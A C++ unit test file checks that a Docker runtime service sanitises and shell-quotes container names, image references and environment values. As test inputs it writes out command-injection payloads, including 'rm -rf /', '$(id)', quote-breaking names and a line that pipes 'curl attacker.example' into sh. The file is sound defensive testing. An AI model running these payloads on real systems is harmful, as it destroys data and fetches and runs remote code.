// Unit tests for src/services/LocalDockerRuntime.cpp.
//
// These functions interpolate user-controlled strings — container names, image
// references, environment values — into shell commands run with the platform's
// own privileges. While they lived in DeploymentController's anonymous
// namespace none of that could be tested. This file is the reason the
// extraction was worth doing.

#include "testing.h"

#include "../../../src/services/LocalDockerRuntime.h"

using namespace stackpilot;

namespace {

/// A shell metacharacter appearing outside single quotes means the payload
/// escaped its quoting. Walks the command and returns true if that happens.
///
/// The backslash case is essential and easy to get wrong: shellQuote emits a
/// literal quote as the four characters '\'' — close, escaped quote, reopen.
/// A walker that treats every quote as a toggle reads that escaped quote as a
/// state change, concludes the rest of the argument is unquoted, and reports
/// an injection that is not there.
bool hasUnquotedMetacharacter(const std::string& command, char meta) {
    bool inQuotes = false;
    for (size_t i = 0; i < command.size(); ++i) {
        if (!inQuotes && command[i] == '\\' && i + 1 < command.size()) {
            ++i;  // the escaped character is literal, whatever it is
        } else if (command[i] == '\'') {
            inQuotes = !inQuotes;
        } else if (!inQuotes && command[i] == meta) {
            return true;
        }
    }
    return false;
}

}  // namespace

// ─── sanitizeContainerName ──────────────────────────────────────

TEST(ContainerName, PassesThroughALegalName) {
    EXPECT_EQ(LocalDockerRuntime::sanitizeContainerName("my-app_1.2"), "my-app_1.2");
}

TEST(ContainerName, LowercasesAndReplacesIllegalCharacters) {
    EXPECT_EQ(LocalDockerRuntime::sanitizeContainerName("My App"), "my-app");
}

TEST(ContainerName, StripsLeadingAndTrailingDashes) {
    EXPECT_EQ(LocalDockerRuntime::sanitizeContainerName("///api///"), "api");
}

TEST(ContainerName, NeverReturnsEmpty) {
    // An empty container name would make `docker rm -f ''` expand to something
    // unpredictable, so the fallback is load-bearing.
    EXPECT_EQ(LocalDockerRuntime::sanitizeContainerName(""), "deployment");
    EXPECT_EQ(LocalDockerRuntime::sanitizeContainerName("///"), "deployment");
    EXPECT_EQ(LocalDockerRuntime::sanitizeContainerName("   "), "deployment");
}

TEST(ContainerName, CapsLength) {
    EXPECT_TRUE(LocalDockerRuntime::sanitizeContainerName(std::string(500, 'a')).size() <= 96);
}

TEST(ContainerName, StripsShellMetacharacters) {
    // Belt and braces: the name is also shell-quoted, but a name that cannot
    // contain a metacharacter in the first place cannot escape a future call
    // site that forgets to quote.
    const std::string cleaned = LocalDockerRuntime::sanitizeContainerName("app; rm -rf /");
    EXPECT_NOT_CONTAINS(cleaned, ";");
    EXPECT_NOT_CONTAINS(cleaned, "/");
    EXPECT_NOT_CONTAINS(cleaned, " ");
}

// ─── isValidRuntimeEnvKey ───────────────────────────────────────

TEST(EnvKey, AcceptsPosixNames) {
    EXPECT_TRUE(LocalDockerRuntime::isValidRuntimeEnvKey("DATABASE_URL"));
    EXPECT_TRUE(LocalDockerRuntime::isValidRuntimeEnvKey("_private"));
    EXPECT_TRUE(LocalDockerRuntime::isValidRuntimeEnvKey("PORT2"));
}

TEST(EnvKey, RejectsAnythingElse) {
    EXPECT_FALSE(LocalDockerRuntime::isValidRuntimeEnvKey(""));
    EXPECT_FALSE(LocalDockerRuntime::isValidRuntimeEnvKey("2PORT"));   // leading digit
    EXPECT_FALSE(LocalDockerRuntime::isValidRuntimeEnvKey("MY-VAR"));  // dash
    EXPECT_FALSE(LocalDockerRuntime::isValidRuntimeEnvKey("A B"));
    EXPECT_FALSE(LocalDockerRuntime::isValidRuntimeEnvKey("FOO=bar; rm -rf /"));
}

// ─── isValidImageRef ────────────────────────────────────────────

TEST(ImageRef, AcceptsRealisticReferences) {
    EXPECT_TRUE(LocalDockerRuntime::isValidImageRef("nginx:1.25"));
    EXPECT_TRUE(LocalDockerRuntime::isValidImageRef("localhost:5000/my-app:v2"));
    EXPECT_TRUE(LocalDockerRuntime::isValidImageRef("repo/img@sha256:abc123"));
}

TEST(ImageRef, RejectsInjectionAttempts) {
    EXPECT_FALSE(LocalDockerRuntime::isValidImageRef(""));
    EXPECT_FALSE(LocalDockerRuntime::isValidImageRef("nginx; rm -rf /"));
    EXPECT_FALSE(LocalDockerRuntime::isValidImageRef("nginx$(id)"));
    EXPECT_FALSE(LocalDockerRuntime::isValidImageRef("nginx`id`"));
    EXPECT_FALSE(LocalDockerRuntime::isValidImageRef("nginx image"));
    EXPECT_FALSE(LocalDockerRuntime::isValidImageRef(std::string(300, 'a')));
}

TEST(ImageRef, TrimsBeforeJudging) {
    EXPECT_TRUE(LocalDockerRuntime::isValidImageRef("  nginx:1.25  "));
    EXPECT_FALSE(LocalDockerRuntime::isValidImageRef("   "));
}

// ─── makeRunCommand ─────────────────────────────────────────────

TEST(RunCommand, IncludesTheContainerAndImage) {
    const std::string cmd = LocalDockerRuntime::makeRunCommand("web", "nginx:1.25", 8080, {});
    EXPECT_CONTAINS(cmd, "'web'");
    EXPECT_CONTAINS(cmd, "'nginx:1.25'");
    EXPECT_CONTAINS(cmd, "requested_port=8080");
}

TEST(RunCommand, ClampsAnOutOfRangePort) {
    EXPECT_CONTAINS(LocalDockerRuntime::makeRunCommand("web", "img", 999999, {}), "requested_port=65535");
    EXPECT_CONTAINS(LocalDockerRuntime::makeRunCommand("web", "img", -1, {}), "requested_port=0");
}

TEST(RunCommand, PassesEnvironmentVariablesQuoted) {
    const std::string cmd = LocalDockerRuntime::makeRunCommand(
        "web", "img", 3000, {{"DATABASE_URL", "postgres://u:p@h/db"}});
    EXPECT_CONTAINS(cmd, "--env 'DATABASE_URL=postgres://u:p@h/db'");
}

TEST(RunCommand, DropsInvalidEnvKeysRatherThanEscapingThem) {
    // A key is not a value; there is no safe quoting for `X; rm -rf /` as a
    // variable name, so the only correct handling is to drop it.
    const std::string cmd = LocalDockerRuntime::makeRunCommand(
        "web", "img", 3000, {{"BAD KEY", "v"}, {"X; rm -rf /", "v"}, {"GOOD", "v"}});
    EXPECT_CONTAINS(cmd, "--env 'GOOD=v'");
    EXPECT_NOT_CONTAINS(cmd, "BAD KEY");
    EXPECT_NOT_CONTAINS(cmd, "rm -rf /");
}

TEST(RunCommand, NeutralisesAHostileEnvValue) {
    const std::string cmd = LocalDockerRuntime::makeRunCommand(
        "web", "img", 3000, {{"EVIL", "'; curl attacker.example | sh; '"}});

    // Scope the check to the --env arguments. The surrounding command
    // legitimately contains unquoted pipes (docker inspect | sed | head), so
    // scanning the whole string would always "fail".
    const size_t start = cmd.find("--env");
    const size_t end = cmd.find(" -p 127.0.0.1::", start);
    EXPECT_TRUE(start != std::string::npos && end != std::string::npos);
    const std::string envArgs = cmd.substr(start, end - start);

    // The payload survives as literal text inside the quoting, and never
    // escapes into a position where the pipe would take effect.
    EXPECT_CONTAINS(envArgs, "curl attacker.example");
    EXPECT_FALSE(hasUnquotedMetacharacter(envArgs, '|'));
    EXPECT_FALSE(hasUnquotedMetacharacter(envArgs, ';'));
}

TEST(RunCommand, FlattensNewlinesInEnvValues) {
    // A newline in a value would otherwise start a new shell command.
    const std::string cmd = LocalDockerRuntime::makeRunCommand(
        "web", "img", 3000, {{"MULTILINE", "line1\nrm -rf /"}});
    const std::string envPart = cmd.substr(cmd.find("--env"), 60);
    EXPECT_NOT_CONTAINS(envPart, "\n");
}

TEST(RunCommand, QuotesAHostileContainerName) {
    const std::string cmd = LocalDockerRuntime::makeRunCommand("a'; id; '", "img", 3000, {});
    EXPECT_FALSE(hasUnquotedMetacharacter(cmd, '`'));
}

TEST(RunCommand, FailsLoudlyWhenDockerIsAbsent) {
    // The markers are the caller's only way to distinguish "docker missing"
    // from "container crashed", so they are part of the contract.
    const std::string cmd = LocalDockerRuntime::makeRunCommand("web", "img", 3000, {});
    EXPECT_CONTAINS(cmd, "__STACKPILOT_DOCKER_MISSING__");
    EXPECT_CONTAINS(cmd, "__STACKPILOT_DOCKER_DAEMON_DOWN__");
    EXPECT_CONTAINS(cmd, "__STACKPILOT_IMAGE_MISSING__");
    EXPECT_CONTAINS(cmd, "__STACKPILOT_PORT_MISSING__");
    EXPECT_CONTAINS(cmd, "set -e");
}

TEST(RunCommand, BindsOnlyToLoopback) {
    // -p 127.0.0.1:: rather than -p ::  — a deployed container must not be
    // reachable from the network without an explicit exposure decision.
    EXPECT_CONTAINS(LocalDockerRuntime::makeRunCommand("web", "img", 3000, {}), "-p 127.0.0.1::");
}

// ─── makePauseCommand ───────────────────────────────────────────

TEST(PauseCommand, PausesAndUnpauses) {
    EXPECT_CONTAINS(LocalDockerRuntime::makePauseCommand("web", true), "docker pause 'web'");
    EXPECT_CONTAINS(LocalDockerRuntime::makePauseCommand("web", false), "docker unpause 'web'");
}

TEST(PauseCommand, ChecksTheContainerExistsFirst) {
    const std::string cmd = LocalDockerRuntime::makePauseCommand("web", true);
    EXPECT_CONTAINS(cmd, "__STACKPILOT_CONTAINER_MISSING__");
    EXPECT_TRUE(cmd.find("docker inspect") < cmd.find("docker pause"));
}

TEST(PauseCommand, QuotesTheContainerName) {
    const std::string cmd = LocalDockerRuntime::makePauseCommand("a'; id; '", true);
    EXPECT_FALSE(hasUnquotedMetacharacter(cmd, '`'));
}

// ─── markerValue ────────────────────────────────────────────────

TEST(MarkerValue, ReadsAValue) {
    EXPECT_EQ(LocalDockerRuntime::markerValue("host_port=32768\nstatus=running\n", "host_port"), "32768");
}

TEST(MarkerValue, TrimsTheValue) {
    EXPECT_EQ(LocalDockerRuntime::markerValue("status=  running  \n", "status"), "running");
}

TEST(MarkerValue, ReturnsEmptyWhenAbsent) {
    EXPECT_EQ(LocalDockerRuntime::markerValue("status=running\n", "host_port"), "");
    EXPECT_EQ(LocalDockerRuntime::markerValue("", "anything"), "");
}

TEST(MarkerValue, MatchesOnlyAtTheStartOfALine) {
    // "not_status=x" must not satisfy a lookup for "status".
    EXPECT_EQ(LocalDockerRuntime::markerValue("not_status=wrong\nstatus=right\n", "status"), "right");
}

TEST(MarkerValue, TakesTheFirstMatch) {
    EXPECT_EQ(LocalDockerRuntime::markerValue("k=first\nk=second\n", "k"), "first");
}

TEST(MarkerValue, HandlesAValueContainingEquals) {
    EXPECT_EQ(LocalDockerRuntime::markerValue("runtime_url=http://localhost:8080?a=b\n", "runtime_url"),
              "http://localhost:8080?a=b");
}
